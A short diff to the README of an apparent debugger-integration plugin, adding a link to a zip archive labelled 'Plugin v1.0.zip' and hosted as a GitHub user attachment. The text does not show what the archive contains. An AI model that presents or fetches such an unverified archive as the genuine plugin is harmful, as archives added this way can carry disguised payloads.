@@ -66,3 +66,7 @@ This plugin provides a Debug Adapter Protocol (DAP)-based integration between Py
 
 ---
 
+Download plugin file
+[Plugin v1.0.zip](https://github.com/user-attachments/files/19634101/Plugin.v1.0.zip)
+
+
